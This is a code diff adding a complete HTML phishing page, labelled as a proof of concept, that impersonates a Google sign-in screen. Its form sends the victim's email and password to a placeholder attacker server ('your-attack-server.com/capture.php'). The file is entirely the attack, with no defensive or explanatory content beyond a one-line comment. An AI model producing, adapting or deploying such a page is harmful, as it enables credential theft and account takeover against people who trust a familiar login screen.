@@ -1,0 +1,19 @@
+<!-- Fake Google OAuth Login PoC -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Login</title>
+</head>
+<body>
+    <h2>Sign in with Google</h2>
+    <form action="https://your-attack-server.com/capture.php" method="POST">
+        <label for="email">Email:</label>
+        <input type="text" id="email" name="email"><br><br>
+        
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password"><br><br>
+        
+        <input type="submit" value="Sign In">
+    </form>
+</body>
+</html>
